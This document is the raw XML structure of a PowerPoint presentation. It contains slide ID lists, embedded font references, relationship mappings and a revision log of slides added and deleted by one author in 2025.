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 id="2147483674" r:id="rId2"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId208"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId3"/>
    <p:sldId id="349" r:id="rId4"/>
    <p:sldId id="311" r:id="rId5"/>
    <p:sldId id="312" r:id="rId6"/>
    <p:sldId id="443" r:id="rId7"/>
    <p:sldId id="313" r:id="rId8"/>
    <p:sldId id="444" r:id="rId9"/>
    <p:sldId id="314" r:id="rId10"/>
    <p:sldId id="445" r:id="rId11"/>
    <p:sldId id="446" r:id="rId12"/>
    <p:sldId id="315" r:id="rId13"/>
    <p:sldId id="321" r:id="rId14"/>
    <p:sldId id="325" r:id="rId15"/>
    <p:sldId id="327" r:id="rId16"/>
    <p:sldId id="447" r:id="rId17"/>
    <p:sldId id="322" r:id="rId18"/>
    <p:sldId id="326" r:id="rId19"/>
    <p:sldId id="448" r:id="rId20"/>
    <p:sldId id="324" r:id="rId21"/>
    <p:sldId id="328" r:id="rId22"/>
    <p:sldId id="449" r:id="rId23"/>
    <p:sldId id="453" r:id="rId24"/>
    <p:sldId id="454" r:id="rId25"/>
    <p:sldId id="455" r:id="rId26"/>
    <p:sldId id="456" r:id="rId27"/>
    <p:sldId id="330" r:id="rId28"/>
    <p:sldId id="331" r:id="rId29"/>
    <p:sldId id="332" r:id="rId30"/>
    <p:sldId id="450" r:id="rId31"/>
    <p:sldId id="451" r:id="rId32"/>
    <p:sldId id="452" r:id="rId33"/>
    <p:sldId id="333" r:id="rId34"/>
    <p:sldId id="457" r:id="rId35"/>
    <p:sldId id="459" r:id="rId36"/>
    <p:sldId id="460" r:id="rId37"/>
    <p:sldId id="461" r:id="rId38"/>
    <p:sldId id="462" r:id="rId39"/>
    <p:sldId id="342" r:id="rId40"/>
    <p:sldId id="343" r:id="rId41"/>
    <p:sldId id="344" r:id="rId42"/>
    <p:sldId id="345" r:id="rId43"/>
    <p:sldId id="346" r:id="rId44"/>
    <p:sldId id="347" r:id="rId45"/>
    <p:sldId id="348" r:id="rId46"/>
    <p:sldId id="350" r:id="rId47"/>
    <p:sldId id="351" r:id="rId48"/>
    <p:sldId id="352" r:id="rId49"/>
    <p:sldId id="356" r:id="rId50"/>
    <p:sldId id="354" r:id="rId51"/>
    <p:sldId id="466" r:id="rId52"/>
    <p:sldId id="463" r:id="rId53"/>
    <p:sldId id="464" r:id="rId54"/>
    <p:sldId id="465" r:id="rId55"/>
    <p:sldId id="467" r:id="rId56"/>
    <p:sldId id="468" r:id="rId57"/>
    <p:sldId id="471" r:id="rId58"/>
    <p:sldId id="469" r:id="rId59"/>
    <p:sldId id="358" r:id="rId60"/>
    <p:sldId id="359" r:id="rId61"/>
    <p:sldId id="360" r:id="rId62"/>
    <p:sldId id="361" r:id="rId63"/>
    <p:sldId id="362" r:id="rId64"/>
    <p:sldId id="364" r:id="rId65"/>
    <p:sldId id="472" r:id="rId66"/>
    <p:sldId id="473" r:id="rId67"/>
    <p:sldId id="474" r:id="rId68"/>
    <p:sldId id="475" r:id="rId69"/>
    <p:sldId id="476" r:id="rId70"/>
    <p:sldId id="477" r:id="rId71"/>
    <p:sldId id="478" r:id="rId72"/>
    <p:sldId id="393" r:id="rId73"/>
    <p:sldId id="394" r:id="rId74"/>
    <p:sldId id="479" r:id="rId75"/>
    <p:sldId id="391" r:id="rId76"/>
    <p:sldId id="392" r:id="rId77"/>
    <p:sldId id="366" r:id="rId78"/>
    <p:sldId id="367" r:id="rId79"/>
    <p:sldId id="480" r:id="rId80"/>
    <p:sldId id="481" r:id="rId81"/>
    <p:sldId id="485" r:id="rId82"/>
    <p:sldId id="482" r:id="rId83"/>
    <p:sldId id="484" r:id="rId84"/>
    <p:sldId id="483" r:id="rId85"/>
    <p:sldId id="486" r:id="rId86"/>
    <p:sldId id="487" r:id="rId87"/>
    <p:sldId id="488" r:id="rId88"/>
    <p:sldId id="489" r:id="rId89"/>
    <p:sldId id="490" r:id="rId90"/>
    <p:sldId id="491" r:id="rId91"/>
    <p:sldId id="492" r:id="rId92"/>
    <p:sldId id="493" r:id="rId93"/>
    <p:sldId id="494" r:id="rId94"/>
    <p:sldId id="505" r:id="rId95"/>
    <p:sldId id="495" r:id="rId96"/>
    <p:sldId id="496" r:id="rId97"/>
    <p:sldId id="497" r:id="rId98"/>
    <p:sldId id="507" r:id="rId99"/>
    <p:sldId id="498" r:id="rId100"/>
    <p:sldId id="499" r:id="rId101"/>
    <p:sldId id="500" r:id="rId102"/>
    <p:sldId id="503" r:id="rId103"/>
    <p:sldId id="501" r:id="rId104"/>
    <p:sldId id="502" r:id="rId105"/>
    <p:sldId id="508" r:id="rId106"/>
    <p:sldId id="509" r:id="rId107"/>
    <p:sldId id="510" r:id="rId108"/>
    <p:sldId id="517" r:id="rId109"/>
    <p:sldId id="511" r:id="rId110"/>
    <p:sldId id="516" r:id="rId111"/>
    <p:sldId id="512" r:id="rId112"/>
    <p:sldId id="518" r:id="rId113"/>
    <p:sldId id="523" r:id="rId114"/>
    <p:sldId id="522" r:id="rId115"/>
    <p:sldId id="513" r:id="rId116"/>
    <p:sldId id="519" r:id="rId117"/>
    <p:sldId id="514" r:id="rId118"/>
    <p:sldId id="520" r:id="rId119"/>
    <p:sldId id="515" r:id="rId120"/>
    <p:sldId id="521" r:id="rId121"/>
    <p:sldId id="524" r:id="rId122"/>
    <p:sldId id="525" r:id="rId123"/>
    <p:sldId id="526" r:id="rId124"/>
    <p:sldId id="527" r:id="rId125"/>
    <p:sldId id="528" r:id="rId126"/>
    <p:sldId id="529" r:id="rId127"/>
    <p:sldId id="530" r:id="rId128"/>
    <p:sldId id="531" r:id="rId129"/>
    <p:sldId id="532" r:id="rId130"/>
    <p:sldId id="533" r:id="rId131"/>
    <p:sldId id="534" r:id="rId132"/>
    <p:sldId id="535" r:id="rId133"/>
    <p:sldId id="536" r:id="rId134"/>
    <p:sldId id="537" r:id="rId135"/>
    <p:sldId id="538" r:id="rId136"/>
    <p:sldId id="539" r:id="rId137"/>
    <p:sldId id="540" r:id="rId138"/>
    <p:sldId id="541" r:id="rId139"/>
    <p:sldId id="542" r:id="rId140"/>
    <p:sldId id="543" r:id="rId141"/>
    <p:sldId id="544" r:id="rId142"/>
    <p:sldId id="545" r:id="rId143"/>
    <p:sldId id="546" r:id="rId144"/>
    <p:sldId id="547" r:id="rId145"/>
    <p:sldId id="548" r:id="rId146"/>
    <p:sldId id="549" r:id="rId147"/>
    <p:sldId id="550" r:id="rId148"/>
    <p:sldId id="551" r:id="rId149"/>
    <p:sldId id="552" r:id="rId150"/>
    <p:sldId id="553" r:id="rId151"/>
    <p:sldId id="554" r:id="rId152"/>
    <p:sldId id="555" r:id="rId153"/>
    <p:sldId id="556" r:id="rId154"/>
    <p:sldId id="557" r:id="rId155"/>
    <p:sldId id="558" r:id="rId156"/>
    <p:sldId id="559" r:id="rId157"/>
    <p:sldId id="560" r:id="rId158"/>
    <p:sldId id="561" r:id="rId159"/>
    <p:sldId id="562" r:id="rId160"/>
    <p:sldId id="563" r:id="rId161"/>
    <p:sldId id="564" r:id="rId162"/>
    <p:sldId id="565" r:id="rId163"/>
    <p:sldId id="566" r:id="rId164"/>
    <p:sldId id="567" r:id="rId165"/>
    <p:sldId id="568" r:id="rId166"/>
    <p:sldId id="569" r:id="rId167"/>
    <p:sldId id="570" r:id="rId168"/>
    <p:sldId id="571" r:id="rId169"/>
    <p:sldId id="572" r:id="rId170"/>
    <p:sldId id="573" r:id="rId171"/>
    <p:sldId id="574" r:id="rId172"/>
    <p:sldId id="575" r:id="rId173"/>
    <p:sldId id="576" r:id="rId174"/>
    <p:sldId id="577" r:id="rId175"/>
    <p:sldId id="578" r:id="rId176"/>
    <p:sldId id="579" r:id="rId177"/>
    <p:sldId id="580" r:id="rId178"/>
    <p:sldId id="581" r:id="rId179"/>
    <p:sldId id="582" r:id="rId180"/>
    <p:sldId id="583" r:id="rId181"/>
    <p:sldId id="584" r:id="rId182"/>
    <p:sldId id="585" r:id="rId183"/>
    <p:sldId id="586" r:id="rId184"/>
    <p:sldId id="587" r:id="rId185"/>
    <p:sldId id="588" r:id="rId186"/>
    <p:sldId id="589" r:id="rId187"/>
    <p:sldId id="590" r:id="rId188"/>
    <p:sldId id="591" r:id="rId189"/>
    <p:sldId id="592" r:id="rId190"/>
    <p:sldId id="593" r:id="rId191"/>
    <p:sldId id="594" r:id="rId192"/>
    <p:sldId id="595" r:id="rId193"/>
    <p:sldId id="596" r:id="rId194"/>
    <p:sldId id="597" r:id="rId195"/>
    <p:sldId id="598" r:id="rId196"/>
    <p:sldId id="599" r:id="rId197"/>
    <p:sldId id="600" r:id="rId198"/>
    <p:sldId id="609" r:id="rId199"/>
    <p:sldId id="601" r:id="rId200"/>
    <p:sldId id="602" r:id="rId201"/>
    <p:sldId id="603" r:id="rId202"/>
    <p:sldId id="604" r:id="rId203"/>
    <p:sldId id="605" r:id="rId204"/>
    <p:sldId id="606" r:id="rId205"/>
    <p:sldId id="607" r:id="rId206"/>
    <p:sldId id="608" r:id="rId207"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="5143500" type="screen16x9"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Albert Sans" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId209"/>
      <p:bold r:id="rId210"/>
      <p:italic r:id="rId211"/>
      <p:boldItalic r:id="rId212"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Manrope ExtraBold" panose="020B0604020202020204" charset="0"/>
      <p:bold r:id="rId213"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Nunito Light" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId214"/>
      <p:italic r:id="rId2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A8D6BC-721F-43A6-8CD3-99E81ABEBA04}" v="34" dt="2025-09-24T01:35:24.019"/>
  </p1510:revLst>
</p1510:revInfo>
</file>

<file path=ppt/tableStyles.xml><?xml version="1.0" encoding="utf-8"?>
<a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{EEEFB3D3-C7DD-41E9-AA9F-930C74197033}">
  <a:tblStyle styleId="{EEEFB3D3-C7DD-41E9-AA9F-930C7419703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820" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="97" d="100"/>
          <a:sy n="97" d="100"/>
        </p:scale>
        <p:origin x="798" y="45"/>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205" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide203.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16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.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206" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide204.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217" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.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slide" Target="slides/slide191.xml"/><Relationship Id="rId207" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide205.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide11.xml"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide107.xml"/><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162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide160.xml"/><Relationship Id="rId183" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide181.xml"/><Relationship Id="rId218" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide22.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31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide129.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208" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="notesMasters/notesMaster1.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide12.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219" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/><Relationship Id="rId214" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font6.fntdata"/><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slide" Target="slides/slide193.xml"/><Relationship Id="rId209" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font1.fntdata"/><Relationship Id="rId190" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide188.xml"/><Relationship Id="rId204" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide202.xml"/><Relationship Id="rId220" Type="http://schemas.microsoft.com/office/2016/11/relationships/changesInfo" Target="changesInfos/changesInfo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10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font2.fntdata"/><Relationship Id="rId215" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font7.fntdata"/><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221" Type="http://schemas.microsoft.com/office/2015/10/relationships/revisionInfo" Target="revisionInfo.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11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font3.fntdata"/><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slide" Target="slides/slide195.xml"/><Relationship Id="rId201" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide199.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12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font4.fntdata"/><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202" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide200.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide16.xml"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide37.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1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide69.xml"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide90.xml"/><Relationship Id="rId213" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font5.fntdata"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster2.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide27.xml"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide38.xml"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide113.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99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide197.xml"/><Relationship Id="rId203" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide201.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide17.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2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vind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{CB22410D-D558-4F0A-A09A-F10324B7999E}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{CB22410D-D558-4F0A-A09A-F10324B7999E}" dt="2025-01-19T15:38:37.910" v="12"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{CB22410D-D558-4F0A-A09A-F10324B7999E}" dt="2025-01-18T09:22:33.371" v="1" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modAnim">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{CB22410D-D558-4F0A-A09A-F10324B7999E}" dt="2025-01-19T15:38:37.910" v="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1043384619" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modAnim">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{CB22410D-D558-4F0A-A09A-F10324B7999E}" dt="2025-01-19T15:37:21.914" v="6"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1367555090" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}"/>
    <pc:docChg chg="undo redo custSel addSld delSld modSld sldOrd addMainMaster modMainMaster">
      <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-09-03T08:59:41.075" v="1707" actId="6549"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="926640750" sldId="296"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4153445261" sldId="297"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2487502488" sldId="298"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2802044914" sldId="299"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2371705201" sldId="300"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1342411519" sldId="301"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1333040795" sldId="302"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1512198622" sldId="303"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1820487836" sldId="304"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3736197696" sldId="305"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1543601722" sldId="306"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1411703306" sldId="307"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="224596145" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="134736877" sldId="309"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:12:54.145" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="913329927" sldId="310"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-31T05:17:22.067" v="150" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2482395273" sldId="311"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-31T05:18:09.182" v="151" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3393039955" sldId="312"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T08:00:55.074" v="313" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="247638959" sldId="313"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T08:05:40.969" v="420" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3365496140" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:10.189" v="156" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1088655363" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:23:57.019" v="5" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2208143273" sldId="316"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:24:01.361" v="6" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4127479935" sldId="317"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:24:06.913" v="7" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1043384619" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:24:13.266" v="8" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2626330317" sldId="319"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-07-30T08:23:43.645" v="4" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3444945899" sldId="320"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del modAnim">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-08T09:26:32.332" v="538" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1367555090" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1669173914" sldId="322"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2172126044" sldId="323"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2116008608" sldId="324"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4080993627" sldId="325"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2923341771" sldId="326"/>
        </pc:sldMkLst>
      </pc:sldChg>
